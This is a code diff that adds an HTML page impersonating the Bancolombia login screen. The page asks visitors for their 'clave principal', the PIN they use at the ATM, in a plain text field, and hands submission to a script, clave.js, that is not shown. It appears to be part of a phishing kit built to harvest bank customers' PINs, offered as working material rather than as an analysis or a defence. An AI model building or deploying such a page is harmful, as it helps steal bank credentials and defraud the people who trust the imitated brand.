@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Bancolombia</title>
+    <link rel="stylesheet" href="styles.css"> <!-- Enlace al CSS -->
+    <script defer src="clave.js"></script> <!-- Archivo JS corregido -->
+</head>
+<body>
+    <header>
+        <div class="logo-container">
+            <img src="logo.png" alt="Bancolombia">
+        </div>
+        <a href="#" class="salir">Salir →</a>
+    </header>
+
+    <main>
+        <div class="login-container">
+            <h2 class="bienvenida">Clave principal</h2> <!-- Bienvenida fuera del formulario -->
+            <div class="login-box">
+                <p>Es la misma que usas en el cajero automático</p>
+                <form id="claveForm"> <!-- SE AGREGÓ EL ID AQUÍ -->
+                    <label for="clave">
+                        <input type="text" id="clave" placeholder="Ingrese su clave" required>
+                    </label>
+                    
+                    <div class="botones">
+                        <button type="button" class="volver">Volver</button>
+                        <button type="submit" class="continuar">Continuar</button> <!-- SE MANTIENE TYPE="SUBMIT" -->
+                    </div>
+                </form>
+            </div>
+        </div>
+    </main>
+</body>
+</html>
